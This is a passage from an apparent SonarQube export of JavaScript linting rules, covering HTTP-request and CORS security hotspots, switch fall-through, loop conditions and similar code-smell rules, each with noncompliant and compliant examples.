  <li> <a href=""https://cwe.mitre.org/data/definitions/214.html"">MITRE, CWE-214</a> - Information Exposure Through Process Environment </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",Using command line arguments is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a1', 'sans-top25-insecure']",SECURITY_HOTSPOT
2019-03-04T09:37:20+0100,"<p>Sending HTTP requests is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8150"">CVE-2014-8150</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000007"">CVE-2018-1000007</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0660"">CVE-2010-0660</a> </li>
</ul>
<p>An HTTP request has different kinds of vulnerabilities:</p>
<ul>
  <li> it sends data which might be intercepted or dangerous. </li>
  <li> it receives a response which might have been crafted by an attacker. </li>
  <li> as each request opens a socket and triggers some processing for the sender and the recipient, it is possible to exhaust resources on both sides
  by sending too many requests. </li>
</ul>
<p>This rule flags code that initiates an HTTP request. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the http connection is encrypted or not. </li>
  <li> the recipient is not allowed to receive some of the data you send. </li>
  <li> the data sent might be dangerous (example: it contains unvalidated user input). </li>
  <li> an uncontrolled number of requests might be sent. For example, a request might be sent every time a user performs an action, and this action is
  not limited. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> First, it is important to encrypt all HTTP connection if there is any chance for them to be eavesdropped. Use HTTPS whenever possible. </li>
  <li> Ensure that you control the URIs you send requests to and the number or requests you send. Your software could otherwise be used to attack
  other services. </li>
  <li> Avoid sending sensitive information, be it in the URL, header or body. If part of the data comes from an untrusted source, such as a user
  input, sanitize it beforehand. </li>
  <li> Validate and sanitize the response before using it in any way. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
// === Built-in NodeJS modules ===
const http = require('http');
http.request(url, (res) =&gt; {}); // Questionable
http.get(url, (res) =&gt; {}); // Questionable

const https = require('https');
https.request(url, (res) =&gt; {}); // Questionable
https.get(url, (res) =&gt; {}); // Questionable
</pre>
<pre>
// === Request NodeJS module ===
const request = require('request');
// All Request methods making HTTP requests are security-sensitive and should be reviewed.
// Examples:
request(url, function (error, res, body) {}); // Questionable
request.get(url); // Questionable
</pre>
<pre>
// === Axios module ===
const axios = require('axios');
// All Axios methods making HTTP requests are security-sensitive and should be reviewed.
// Example:
axios.get(url) // Questionable
  .then(function (res) {});
</pre>
<pre>
// === In browser, XMLHttpRequest ===
var xmlhttp = null;
if (window.XMLHttpRequest) {
  xmlhttp = new XMLHttpRequest(); // modern browsers
} else {
  xmlhttp = new ActiveXObject(""Microsoft.XMLHTTP""); // very old IE browsers
}
xmlhttp.onreadystatechange = function() {};
xmlhttp.open(""GET"", url, false); // Questionable
xmlhttp.send();
</pre>
<pre>
// === In modern browsers, Fetch API ===
window.fetch(url) // Questionable
  .then(function(res) {});
</pre>
<pre>
// === In old IE browsers, XDomainRequest ===
var xdr = new XDomainRequest();
xdr.open(""GET"", url);
xdr.send();
</pre>
<pre>
// === In browser, jQuery ===
// All jQuery methods making HTTP requests are security-sensitive and should be reviewed.
// Examples:
$.ajax({ url: url }) // Questionable
  .done(function(data) {});
$.get(url, function(data) {}); // Questionable
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/400"">MITRE, CWE-400</a> - Uncontrolled Resource Consumption ('Resource Exhaustion') </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/200.html"">MITRE, CWE-200</a> - Information Exposure </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
</ul>",javascript:S4825,js,JavaScript,"<p>Sending HTTP requests is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8150"">CVE-2014-8150</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000007"">CVE-2018-1000007</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0660"">CVE-2010-0660</a> </li>
</ul>
<p>An HTTP request has different kinds of vulnerabilities:</p>
<ul>
  <li> it sends data which might be intercepted or dangerous. </li>
  <li> it receives a response which might have been crafted by an attacker. </li>
  <li> as each request opens a socket and triggers some processing for the sender and the recipient, it is possible to exhaust resources on both sides
  by sending too many requests. </li>
</ul>
<p>This rule flags code that initiates an HTTP request. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the http connection is encrypted or not. </li>
  <li> the recipient is not allowed to receive some of the data you send. </li>
  <li> the data sent might be dangerous (example: it contains unvalidated user input). </li>
  <li> an uncontrolled number of requests might be sent. For example, a request might be sent every time a user performs an action, and this action is
  not limited. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> First, it is important to encrypt all HTTP connection if there is any chance for them to be eavesdropped. Use HTTPS whenever possible. </li>
  <li> Ensure that you control the URIs you send requests to and the number or requests you send. Your software could otherwise be used to attack
  other services. </li>
  <li> Avoid sending sensitive information, be it in the URL, header or body. If part of the data comes from an untrusted source, such as a user
  input, sanitize it beforehand. </li>
  <li> Validate and sanitize the response before using it in any way. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
// === Built-in NodeJS modules ===
const http = require('http');
http.request(url, (res) =&gt; {}); // Questionable
http.get(url, (res) =&gt; {}); // Questionable

const https = require('https');
https.request(url, (res) =&gt; {}); // Questionable
https.get(url, (res) =&gt; {}); // Questionable
</pre>
<pre>
// === Request NodeJS module ===
const request = require('request');
// All Request methods making HTTP requests are security-sensitive and should be reviewed.
// Examples:
request(url, function (error, res, body) {}); // Questionable
request.get(url); // Questionable
</pre>
<pre>
// === Axios module ===
const axios = require('axios');
// All Axios methods making HTTP requests are security-sensitive and should be reviewed.
// Example:
axios.get(url) // Questionable
  .then(function (res) {});
</pre>
<pre>
// === In browser, XMLHttpRequest ===
var xmlhttp = null;
if (window.XMLHttpRequest) {
  xmlhttp = new XMLHttpRequest(); // modern browsers
} else {
  xmlhttp = new ActiveXObject(""Microsoft.XMLHTTP""); // very old IE browsers
}
xmlhttp.onreadystatechange = function() {};
xmlhttp.open(""GET"", url, false); // Questionable
xmlhttp.send();
</pre>
<pre>
// === In modern browsers, Fetch API ===
window.fetch(url) // Questionable
  .then(function(res) {});
</pre>
<pre>
// === In old IE browsers, XDomainRequest ===
var xdr = new XDomainRequest();
xdr.open(""GET"", url);
xdr.send();
</pre>
<pre>
// === In browser, jQuery ===
// All jQuery methods making HTTP requests are security-sensitive and should be reviewed.
// Examples:
$.ajax({ url: url }) // Questionable
  .done(function(data) {});
$.get(url, function(data) {}); // Questionable
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/400"">MITRE, CWE-400</a> - Uncontrolled Resource Consumption ('Resource Exhaustion') </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/200.html"">MITRE, CWE-200</a> - Information Exposure </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
</ul>",Sending HTTP requests is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a1', 'owasp-a3']",SECURITY_HOTSPOT
2013-06-19T07:34:52+0200,"<p>When the execution is not explicitly terminated at the end of a switch case, it continues to execute the statements of the following case. While
this is sometimes intentional, it often is a mistake which leads to unexpected behavior. </p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (myVariable) {
  case 1:
    foo();
    break;
  case 2:  // Both 'doSomething()' and 'doSomethingElse()' will be executed. Is it on purpose ?
    doSomething();
  default:
    doSomethingElse();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch (myVariable) {
  case 1:
    foo();
    break;
  case 2:
    doSomething();
    break;
  default:
    doSomethingElse();
    break;
}
</pre>
<h2>Exceptions</h2>
<p>This rule is relaxed in the following cases:</p>
<pre>
switch (myVariable) {
  case 0:                                // Empty case used to specify the same behavior for a group of cases.
  case 1:
    doSomething();
    break;
  case 2:                                // Use of return statement
    return;
  case 3:                               // Ends with comment when fall-through is intentional
    console.log(""this case falls through"")
    // fall through
  case 4:                                // Use of throw statement
    throw new IllegalStateException();
  case 5:                                // Use of continue statement
    continue;
  default:                               // For the last case, use of break statement is optional
    doSomethingElse();
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 15.0 - The MISRA C <em>switch</em> syntax shall be used. </li>
  <li> MISRA C:2004, 15.2 - An unconditional break statement shall terminate every non-empty switch clause </li>
  <li> MISRA C++:2008, 6-4-3 - A switch statement shall be a well-formed switch statement. </li>
  <li> MISRA C++:2008, 6-4-5 - An unconditional throw or break statement shall terminate every non-empty switch-clause </li>
  <li> MISRA C:2012, 16.1 - All switch statements shall be well-formed </li>
  <li> MISRA C:2012, 16.3 - An unconditional break statement shall terminate every switch-clause </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/484.html"">MITRE, CWE-484</a> - Omitted Break Statement in Switch </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/YIFLAQ"">CERT, MSC17-C.</a> - Finish every set of statements associated with a case
  label with a break statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/ewHAAQ"">CERT, MSC52-J.</a> - Finish every set of statements associated with a case
  label with a break statement </li>
</ul>",javascript:NonEmptyCaseWithoutBreak,js,JavaScript,"<p>When the execution is not explicitly terminated at the end of a switch case, it continues to execute the statements of the following case. While
this is sometimes intentional, it often is a mistake which leads to unexpected behavior. </p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (myVariable) {
  case 1:
    foo();
    break;
  case 2:  // Both 'doSomething()' and 'doSomethingElse()' will be executed. Is it on purpose ?
    doSomething();
  default:
    doSomethingElse();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch (myVariable) {
  case 1:
    foo();
    break;
  case 2:
    doSomething();
    break;
  default:
    doSomethingElse();
    break;
}
</pre>
<h2>Exceptions</h2>
<p>This rule is relaxed in the following cases:</p>
<pre>
switch (myVariable) {
  case 0:                                // Empty case used to specify the same behavior for a group of cases.
  case 1:
    doSomething();
    break;
  case 2:                                // Use of return statement
    return;
  case 3:                               // Ends with comment when fall-through is intentional
    console.log(""this case falls through"")
    // fall through
  case 4:                                // Use of throw statement
    throw new IllegalStateException();
  case 5:                                // Use of continue statement
    continue;
  default:                               // For the last case, use of break statement is optional
    doSomethingElse();
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 15.0 - The MISRA C <em>switch</em> syntax shall be used. </li>
  <li> MISRA C:2004, 15.2 - An unconditional break statement shall terminate every non-empty switch clause </li>
  <li> MISRA C++:2008, 6-4-3 - A switch statement shall be a well-formed switch statement. </li>
  <li> MISRA C++:2008, 6-4-5 - An unconditional throw or break statement shall terminate every non-empty switch-clause </li>
  <li> MISRA C:2012, 16.1 - All switch statements shall be well-formed </li>
  <li> MISRA C:2012, 16.3 - An unconditional break statement shall terminate every switch-clause </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/484.html"">MITRE, CWE-484</a> - Omitted Break Statement in Switch </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/YIFLAQ"">CERT, MSC17-C.</a> - Finish every set of statements associated with a case
  label with a break statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/ewHAAQ"">CERT, MSC52-J.</a> - Finish every set of statements associated with a case
  label with a break statement </li>
</ul>","Switch cases should end with an unconditional ""break"" statement",[],BLOCKER,"['cert', 'cwe', 'misra', 'suspicious']",CODE_SMELL
2015-05-20T05:01:36+0200,"<p>Testing <code>for</code> loop termination using an equality operator (<code>==</code> and <code>!=</code>) is dangerous, because it could set up an
infinite loop. Using a broader relational operator instead casts a wider net, and makes it harder (but not impossible) to accidentally write an
infinite loop.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (var i = 1; i != 10; i += 2)  // Noncompliant. Infinite; i goes from 9 straight to 11.
{
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (var i = 1; i &lt;= 10; i += 2)  // Compliant
{
  //...
}
</pre>
<h2>Exceptions</h2>
<p>Equality operators are ignored if the loop counter is not modified within the body of the loop and either:</p>
<ul>
  <li> starts below the ending value and is incremented by 1 on each iteration. </li>
  <li> starts above the ending value and is decremented by 1 on each iteration. </li>
</ul>
<p>Equality operators are also ignored when the test is against <code>null</code>.</p>
<pre>
for (var i = 0; arr[i] != null; i++) {
  // ...
}

for (var i = 0; (item = arr[i]) != null; i++) {
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 6-5-2 </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/835"">MITRE, CWE-835</a> - Loop with Unreachable Exit Condition ('Infinite Loop') </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/EwDJAQ"">CERT, MSC21-C.</a> - Use robust loop termination conditions </li>
</ul>",javascript:S888,js,JavaScript,"<p>Testing <code>for</code> loop termination using an equality operator (<code>==</code> and <code>!=</code>) is dangerous, because it could set up an
infinite loop. Using a broader relational operator instead casts a wider net, and makes it harder (but not impossible) to accidentally write an
infinite loop.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (var i = 1; i != 10; i += 2)  // Noncompliant. Infinite; i goes from 9 straight to 11.
{
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (var i = 1; i &lt;= 10; i += 2)  // Compliant
{
  //...
}
</pre>
<h2>Exceptions</h2>
<p>Equality operators are ignored if the loop counter is not modified within the body of the loop and either:</p>
<ul>
  <li> starts below the ending value and is incremented by 1 on each iteration. </li>
  <li> starts above the ending value and is decremented by 1 on each iteration. </li>
</ul>
<p>Equality operators are also ignored when the test is against <code>null</code>.</p>
<pre>
for (var i = 0; arr[i] != null; i++) {
  // ...
}

for (var i = 0; (item = arr[i]) != null; i++) {
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 6-5-2 </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/835"">MITRE, CWE-835</a> - Loop with Unreachable Exit Condition ('Infinite Loop') </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/EwDJAQ"">CERT, MSC21-C.</a> - Use robust loop termination conditions </li>
</ul>","Equality operators should not be used in ""for"" loop termination conditions",[],CRITICAL,"['cert', 'cwe', 'misra', 'suspicious']",CODE_SMELL
2017-11-14T07:57:44+0100,"<p>Creating a new <code>Error</code> without actually throwing it is useless and is probably due to a mistake.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x &lt; 0) {
  new Error(""x must be nonnegative"");
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (x &lt; 0) {
  throw new Error(""x must be nonnegative"");
}
</pre>",javascript:S3984,js,JavaScript,"<p>Creating a new <code>Error</code> without actually throwing it is useless and is probably due to a mistake.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x &lt; 0) {
  new Error(""x must be nonnegative"");
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (x &lt; 0) {
  throw new Error(""x must be nonnegative"");
}
</pre>",Errors should not be created without being thrown,[],MAJOR,['error-handling'],BUG
2014-01-24T08:40:40+0100,"<p><code>alert(...)</code> as well as <code>confirm(...)</code> and <code>prompt(...)</code> can be useful for debugging during development, but in
production mode this kind of pop-up could expose sensitive information to attackers, and should never be displayed. </p>
<h2>Noncompliant Code Example</h2>
<pre>
if(unexpectedCondition) {
  alert(""Unexpected Condition"");
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/489.html"">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
</ul>",javascript:S1442,js,JavaScript,"<p><code>alert(...)</code> as well as <code>confirm(...)</code> and <code>prompt(...)</code> can be useful for debugging during development, but in
production mode this kind of pop-up could expose sensitive information to attackers, and should never be displayed. </p>
<h2>Noncompliant Code Example</h2>
<pre>
if(unexpectedCondition) {
  alert(""Unexpected Condition"");
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/489.html"">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
</ul>","""alert(...)"" should not be used",[],MINOR,"['cwe', 'owasp-a3', 'user-experience']",VULNERABILITY
2019-03-04T09:37:20+0100,"<p>Enabling Cross-Origin Resource Sharing (CORS) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0269"">CVE-2018-0269</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14460"">CVE-2017-14460</a> </li>
</ul>
<p>Applications that enable CORS will effectively relax the same-origin policy in browsers, which is in place to prevent AJAX requests to hosts other
than the one showing in the browser address bar. Being too permissive, CORS can potentially allow an attacker to gain access to sensitive
information.</p>
<p>This rule flags code that enables CORS or specifies any HTTP response headers associated with CORS. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Any URLs responding with <code>Access-Control-Allow-Origin: *</code> include sensitive content. </li>
  <li> Any domains specified in <code>Access-Control-Allow-Origin</code> headers are checked against a whitelist. </li>
</ul>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> The <code>Access-Control-Allow-Origin</code> header should be set only on specific URLs that require access from other domains. Don't enable
  the header on the entire domain. </li>
  <li> Don't rely on the <code>Origin</code> header blindly without validation as it could be spoofed by an attacker. Use a whitelist to check that
  the <code>Origin</code> domain (including protocol) is allowed before returning it back in the <code>Access-Control-Allow-Origin</code> header.
  </li>
  <li> Use <code>Access-Control-Allow-Origin: *</code> only if your application absolutely requires it, for example in the case of an open/public API.
  For such endpoints, make sure that there is no sensitive content or information included in the response. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
// === NodeJS built-in modules ===
const http = require('http');
const srv = http.createServer((req, res) =&gt; {
  res.writeHead(200, { 'Access-Control-Allow-Origin': '*' }); // Questionable
  res.end('ok');
});
srv.listen(3000);
</pre>
<pre>
// === ExpressJS ===
const express = require('express');
const cors = require('cors');
const app = express();
app.use(cors()); // Questionable
app.get('/product/:id', cors(), function (req, res, next) {}); // Questionable
app.listen(3000);
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration"">OWASP Top 10 2017</a> - Category A6 - Security
  Misconfiguration </li>
  <li> <a href=""https://www.owasp.org/index.php/HTML5_Security_Cheat_Sheet#Cross_Origin_Resource_Sharing"">OWASP HTML5 Security Cheat Sheet</a> - Cross
  Origin Resource Sharing </li>
  <li> <a href=""https://www.owasp.org/index.php/CORS_OriginHeaderScrutiny"">OWASP CORS OriginHeaderScrutiny</a> </li>
  <li> <a href=""https://www.owasp.org/index.php/CORS_RequestPreflighScrutiny"">OWASP CORS RequestPreflighScrutiny</a> </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/346.html"">MITRE, CWE-346</a> - Origin Validation Error </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/942.html"">MITRE, CWE-942</a> - Overly Permissive Cross-domain Whitelist </li>
</ul>",javascript:S5122,js,JavaScript,"<p>Enabling Cross-Origin Resource Sharing (CORS) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0269"">CVE-2018-0269</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14460"">CVE-2017-14460</a> </li>
</ul>
<p>Applications that enable CORS will effectively relax the same-origin policy in browsers, which is in place to prevent AJAX requests to hosts other
than the one showing in the browser address bar. Being too permissive, CORS can potentially allow an attacker to gain access to sensitive
information.</p>
<p>This rule flags code that enables CORS or specifies any HTTP response headers associated with CORS. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Any URLs responding with <code>Access-Control-Allow-Origin: *</code> include sensitive content. </li>
  <li> Any domains specified in <code>Access-Control-Allow-Origin</code> headers are checked against a whitelist. </li>
</ul>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> The <code>Access-Control-Allow-Origin</code> header should be set only on specific URLs that require access from other domains. Don't enable
  the header on the entire domain. </li>
  <li> Don't rely on the <code>Origin</code> header blindly without validation as it could be spoofed by an attacker. Use a whitelist to check that
  the <code>Origin</code> domain (including protocol) is allowed before returning it back in the <code>Access-Control-Allow-Origin</code> header.
  </li>
  <li> Use <code>Access-Control-Allow-Origin: *</code> only if your application absolutely requires it, for example in the case of an open/public API.
  For such endpoints, make sure that there is no sensitive content or information included in the response. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
// === NodeJS built-in modules ===
const http = require('http');
const srv = http.createServer((req, res) =&gt; {
  res.writeHead(200, { 'Access-Control-Allow-Origin': '*' }); // Questionable
  res.end('ok');
});
srv.listen(3000);
</pre>
<pre>
// === ExpressJS ===
const express = require('express');
const cors = require('cors');
const app = express();
app.use(cors()); // Questionable
app.get('/product/:id', cors(), function (req, res, next) {}); // Questionable
app.listen(3000);
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration"">OWASP Top 10 2017</a> - Category A6 - Security
  Misconfiguration </li>
  <li> <a href=""https://www.owasp.org/index.php/HTML5_Security_Cheat_Sheet#Cross_Origin_Resource_Sharing"">OWASP HTML5 Security Cheat Sheet</a> - Cross
  Origin Resource Sharing </li>
  <li> <a href=""https://www.owasp.org/index.php/CORS_OriginHeaderScrutiny"">OWASP CORS OriginHeaderScrutiny</a> </li>
  <li> <a href=""https://www.owasp.org/index.php/CORS_RequestPreflighScrutiny"">OWASP CORS RequestPreflighScrutiny</a> </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/346.html"">MITRE, CWE-346</a> - Origin Validation Error </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/942.html"">MITRE, CWE-942</a> - Overly Permissive Cross-domain Whitelist </li>
</ul>",Enabling Cross-Origin Resource Sharing is security-sensitive,[],MINOR,"['cwe', 'owasp-a6', 'sans-top25-porous']",SECURITY_HOTSPOT
2018-10-25T10:33:53+0200,"<p>It is needlessly complex to invert the result of a boolean comparison. The opposite comparison should be made instead.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
if (!(a === 2)) { ... }  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
if (a !== 2) { ... }
</pre>",javascript:S1940,js,JavaScript,"<p>It is needlessly complex to invert the result of a boolean comparison. The opposite comparison should be made instead.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
if (!(a === 2)) { ... }  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
if (a !== 2) { ... }
</pre>",Boolean checks should not be inverted,[],MINOR,['pitfall'],CODE_SMELL
2014-01-24T08:40:40+0100,"<p>When only the condition expression is defined in a <code>for</code> loop, and the initialization and increment expressions are missing, a
<code>while</code> loop should be used instead to increase readability. </p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
for (;condition;) { /*...*/ }
</pre>
<h2>Compliant Solution</h2>
<pre>
while (condition) { /*...*/ }
</pre>",javascript:S1264,js,JavaScript,"<p>When only the condition expression is defined in a <code>for</code> loop, and the initialization and increment expressions are missing, a
<code>while</code> loop should be used instead to increase readability. </p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
for (;condition;) { /*...*/ }
</pre>
<h2>Compliant Solution</h2>
<pre>
while (condition) { /*...*/ }
</pre>","A ""while"" loop should be used instead of a ""for"" loop",[],MINOR,['clumsy'],CODE_SMELL
2018-10-25T10:33:53+0200,"<p>When <code>switch</code> statements have large sets of <code>case</code> clauses, it is usually an attempt to map two sets of data. A real map
structure would be more readable and maintainable, and should be used instead.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>",javascript:S1479,js,JavaScript,"<p>When <code>switch</code> statements have large sets of <code>case</code> clauses, it is usually an attempt to map two sets of data. A real map
structure would be more readable and maintainable, and should be used instead.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>","""switch"" statements should not have too many ""case"" clauses","[{'key': 'maximum', 'htmlDesc': 'Maximum number of &quot;case&quot;.', 'defaultValue': '30', 'type': 'INTEGER'}]",MAJOR,['brain-overload'],CODE_SMELL
2014-01-24T08:40:40+0100,"<p>Return of boolean literal statements wrapped into <code>if-then-else</code> ones should be simplified. </p>
<p>Note that if the result of the expression is not a boolean but for instance an integer, then double negation should be used for proper
conversion.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
if (expression) {
  return true;
} else {
  return false;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
return expression;
</pre>
<p>or </p>
<pre>
return !!expression;
</pre>",javascript:S1126,js,JavaScript,"<p>Return of boolean literal statements wrapped into <code>if-then-else</code> ones should be simplified. </p>
<p>Note that if the result of the expression is not a boolean but for instance an integer, then double negation should be used for proper
conversion.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
if (expression) {
  return true;
} else {
  return false;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
return expression;
</pre>
<p>or </p>
<pre>
return !!expression;
</pre>","Return of boolean expressions should not be wrapped into an ""if-then-else"" statement",[],MINOR,['clumsy'],CODE_SMELL
2017-01-06T12:29:48+0100,"<p>Declaring a variable only to immediately return or throw it is a bad practice.</p>
<p>Some developers argue that the practice improves code readability, because it enables them to explicitly name what is being returned. However, this
variable is an internal implementation detail that is not exposed to the callers of the method. The method name should be sufficient for callers to
know exactly what will be returned.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
function computeDurationInMilliseconds() {
  var duration = (((hours * 60) + minutes) * 60 + seconds ) * 1000 ;
  return duration;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function computeDurationInMilliseconds() {
  return (((hours * 60) + minutes) * 60 + seconds ) * 1000 ;
}
</pre>",javascript:S1488,js,JavaScript,"<p>Declaring a variable only to immediately return or throw it is a bad practice.</p>
<p>Some developers argue that the practice improves code readability, because it enables them to explicitly name what is being returned. However, this
variable is an internal implementation detail that is not exposed to the callers of the method. The method name should be sufficient for callers to
know exactly what will be returned.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
function computeDurationInMilliseconds() {
  var duration = (((hours * 60) + minutes) * 60 + seconds ) * 1000 ;
  return duration;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function computeDurationInMilliseconds() {
  return (((hours * 60) + minutes) * 60 + seconds ) * 1000 ;
}
</pre>",Local variables should not be declared and then immediately returned or thrown,[],MINOR,['clumsy'],CODE_SMELL
2014-01-24T08:40:40+0100,"<p>Boolean literals should be avoided in comparison expressions <code>==</code> and <code>!=</code> to improve code readability.</p>
<p>This rule also reports on redundant boolean operations.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
let someValue = ""0"";
// ...

if (someValue == true) { /* ... */ }
if (someBooleanValue != true) { /* ... */ }
doSomething(!false);
</pre>
<h2>Compliant Solution</h2>
<pre>
if (someValue &amp;&amp; someValue != ""0"") { /* ... */ }
if (!someBooleanValue) { /* ... */ }
doSomething(true);
</pre>",javascript:S1125,js,JavaScript,"<p>Boolean literals should be avoided in comparison expressions <code>==</code> and <code>!=</code> to improve code readability.</p>
<p>This rule also reports on redundant boolean operations.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
let someValue = ""0"";
// ...

if (someValue == true) { /* ... */ }
if (someBooleanValue != true) { /* ... */ }
doSomething(!false);
</pre>
<h2>Compliant Solution</h2>
<pre>
if (someValue &amp;&amp; someValue != ""0"") { /* ... */ }
if (!someBooleanValue) { /* ... */ }
doSomething(true);
</pre>",Boolean literals should not be used in comparisons,[],MINOR,['clumsy'],CODE_SMELL
2017-02-10T12:47:25+0100,"<p>Just because you <em>can</em> do something, doesn't mean you should, and that's the case with nested ternary operations. Nesting ternary operators
results in the kind of code that may seem clear as day when you write it, but six months later will leave maintainers (or worse - future you)
scratching their heads and cursing.</p>
<p>Instead, err on the side of clarity, and use another line to express the nested operation as a separate statement.</p>
